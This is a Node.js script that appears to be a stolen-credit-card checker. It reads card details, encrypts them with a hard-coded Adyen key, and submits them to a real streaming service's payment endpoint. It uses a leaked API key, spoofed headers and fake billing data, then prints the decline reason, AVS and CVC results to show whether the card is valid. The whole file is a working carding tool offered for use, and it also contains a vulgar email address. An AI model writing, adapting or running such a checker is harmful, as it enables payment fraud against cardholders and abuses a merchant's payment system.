const adyenEncrypt = require('node-adyen-encrypt')(25)
const fetch = require('node-fetch')
const query = require('readline-sync');

    
    var list = query.question("Enter Credit Card:");
    var regex= new RegExp("^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")
    if (regex.test(list)){
        console.log('Invalid Format')
        process.exit()
    }else{
       console.log('Processing the card')
    }
    var list = list.split("|")
    var cc= list[0]
    var mm = list[1]
    var yy = list[2]
    var cvc = list[3]

    var key = "10001|C9552E35949AFB903F2DFC88A87728D6FAABE805D63D354063D39E6A1C21A7A47BBF8806AB544EEDDA8A1B167667892BEE3C7F198A87522A888003EB5D74A2AE7B118EA1209A269234F30B5BC3E6F4E125D92405C3CFD7FB6D4A8AC86435B0B3D7E8FB58FF4234FDB163B3B85609CFB6A1985C2F25859F5564F29894F415375A40B90F6FB78B2E9F003EC506EA7DC3FA6FFD3657B018F53C20C1E53E7EE16F75B402EA3439CB2D894F109112D5DB845877E7730518CB761AAC7E201DE60CC2AE12686D0EC43B3D39E0D1A2413ED6369B5D83F6CBAF1118DA9AAA1EF86DE53DA05724614FC40679C10AD99F62EB0C0D9E589FFF2B72AB9A2B4807F97C99A108AB"     
    var options = {};
    var generationtime = new Date().toISOString()
    const cardData = {
        number : cc, 
        cvc : cvc,   
        holderName : "John Doe", 
        expiryMonth : mm, 
        expiryYear : yy,  
        generationtime : generationtime 
    };
    var cseInstance = adyenEncrypt.createEncryption(key, options);
    var ecc = cseInstance.encrypt(cardData);
    var emm = cseInstance.encrypt(cardData);
    var eyy = cseInstance.encrypt(cardData);
    var ecvc = cseInstance.encrypt(cardData);

    fetch("https://wuxfdb4hkd.execute-api.us-west-2.amazonaws.com/throttled/pureflix-AdyenPayments-prod", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "content-type": "application/json;charset=UTF-8",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
    "sec-ch-ua-mobile": "?0",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "cross-site",
    "x-api-key": "JSOPMsTlAS73D2SmBtcFsrtFVwbhwxX4iEkBNC22"
  },
  "referrer": "https://signup.pureflix.com/signup/payment",
  "referrerPolicy": "no-referrer-when-downgrade",
  "body": `{\"paymentMethod\":{\"type\":\"scheme\",\"encryptedCardNumber\":\"${ecc}\",\"encryptedSecurityCode\":\"${ecvc}\",\"encryptedExpiryMonth\":\"${emm}\",\"encryptedExpiryYear\":\"${eyy}\",\"holderName\":\"Joy\",\"billingAddress\":{\"city\":\"NA\",\"country\":\"US\",\"houseNumberOrName\":\"NA\",\"postalCode\":\"10080\",\"stateOrProvince\":\"NA\",\"street\":\"NA\"}},\"returnUrl\":\"https://signup.pureflix.com/signup/payment\",\"mpxUserId\":\"https://euid.theplatform.com/idm/data/User/NwFqg_Qft4_jzwX1/732275945\",\"shopperEmail\":\"joycameintoyourpussy@gmail.com\"}`,
  "method": "POST",
  "mode": "cors"
})
.then(response => response.json())
.then(data => {
    console.log('Status:', data.resultCode)
    console.log('Reason:', data.refusalReason)
    console.log('AVS:', data.additionalData.avsResult)
    console.log('CVC:', data.additionalData.cvcResult)
    console.log('Country:', data.additionalData.issuerCountry)
    console.log('Made By Exo @ycxaz')
 })
.catch((error) => {
  console.error('Error:', error);
});




            


